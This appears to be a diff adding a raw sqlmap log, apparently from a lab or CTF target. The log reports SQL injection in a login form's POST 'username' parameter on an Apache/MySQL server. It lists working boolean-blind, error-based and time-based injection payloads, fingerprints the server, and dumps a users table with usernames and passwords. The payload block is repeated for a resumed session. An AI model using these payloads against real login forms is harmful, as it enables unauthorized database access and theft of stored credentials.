@@ -1,0 +1,46 @@
+sqlmap identified the following injection point(s) with a total of 337 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=RYBL' RLIKE (SELECT (CASE WHEN (4445=4445) THEN 0x5259424c ELSE 0x28 END))-- iTZC&password=
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=RYBL' OR (SELECT 2182 FROM(SELECT COUNT(*),CONCAT(0x716b786271,(SELECT (ELT(2182=2182,1))),0x716a627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- PRgf&password=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: username=RYBL' OR SLEEP(5)-- bflc&password=
+---
+web server operating system: Linux Ubuntu 16.04 (xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0
+Database: users
+Table: users
+[2 entries]
++------------+------------+
+| username   | password   |
++------------+------------+
+| secretpass | secretpass |
+| pingudad   | pingudad   |
++------------+------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=RYBL' RLIKE (SELECT (CASE WHEN (4445=4445) THEN 0x5259424c ELSE 0x28 END))-- iTZC&password=
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=RYBL' OR (SELECT 2182 FROM(SELECT COUNT(*),CONCAT(0x716b786271,(SELECT (ELT(2182=2182,1))),0x716a627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- PRgf&password=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: username=RYBL' OR SLEEP(5)-- bflc&password=
+---
+web server operating system: Linux Ubuntu 16.04 (xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0
